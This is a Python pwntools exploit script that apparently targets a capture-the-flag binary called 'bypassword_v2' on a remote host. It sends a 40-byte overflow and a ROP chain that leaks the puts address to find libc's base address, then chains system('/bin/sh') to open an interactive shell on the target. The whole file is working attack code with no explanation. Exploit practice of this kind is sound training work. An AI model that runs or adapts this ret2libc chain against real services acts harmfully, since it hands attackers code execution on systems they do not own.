from pwn import *

context.binary = elf = ELF('./bypassword_v2')

# pr = process()
pr = remote('94.237.55.96',48134)
# gdb .attach(pr,'''
#            br *menu+355
#           c
#           ''')
rop1 = ROP(elf)
libc = elf.libc

pr.sendline(b'2')

payload = b'A'*40
rop1.call(elf.symbols['puts'],[elf.got['puts']])
rop1.call(elf.symbols['menu'])
pr.sendline(payload + rop1.chain())
pr.recvuntil(b'Invalid credentials! You are logged in as user.\n')
puts_leak = pr.recvline()[7:-1]
print(puts_leak)
libc.address = int.from_bytes(puts_leak,'little') - libc.symbols['puts']
log.info(f'libc base: {hex(libc.address)}')

pr.sendline(b'2')
rop2 = ROP(libc)

rop2.call(libc.symbols['system'],[next(libc.search(b'/bin/sh\x00'))])
pr.sendline(payload + p64(elf.sym['menu']+0x163)+rop2.chain())
pr.interactive()
